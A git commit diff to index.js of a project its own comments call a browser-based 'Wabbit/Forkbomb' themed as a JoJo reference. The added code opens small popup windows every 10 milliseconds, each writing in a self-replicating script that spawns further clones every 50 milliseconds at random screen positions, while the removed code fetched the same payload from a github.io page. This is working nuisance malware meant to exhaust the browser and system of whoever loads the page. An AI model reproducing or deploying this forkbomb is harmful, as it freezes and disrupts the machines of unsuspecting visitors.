3f00df767b10afc75624fc122255d6ac6c77947a
Jack <jack@insertdomain.name>
2020-02-15 21:33:49 -0500

    Rollback changes, idk what im doing.

--- index.js
+++ index.js
@@ -1,16 +1,11 @@
 //Chrome experience requiem
 //A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.
-let wabbitContent = '';
-
-(async () => {
-	wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
-})();
 
 function createWabbit() { //Create a very similar clone window, with code to clone itself.
-	const wabbitSym = Symbol('wabbit');
-	this[wabbitSym] = window.open('','Wha-','width = 200,height = 200');
-	this[wabbitSym].document.write(wabbitContent);
-  	this[wabbitSym].moveTo((Math.random()*screen.width),(Math.random()*screen.height));
+  var wabbit = window.open('','','width = 200,height = 200');
+  wabbit.document.write('<!DOCTYPE html><html><head><title>Wha-</title></head><body><script>function createWabbit() {var wabbit = window.open("","","width = 200,height = 200");wabbit.document.write("<!DOCTYPE html><html>".concat(document.documentElement.innerHTML).concat("</html>"));wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));}; setTimeout(setInterval(createWabbit,50),50);</script>Wha-</body></html>');
+  wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
+  wabbitsMade = wabbitsMade + 1;
 }
 
 setTimeout(function() {document.getElementById('theme').play(); setTimeout(function() {setInterval(createWabbit,10)}, 3000);}, 2750); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
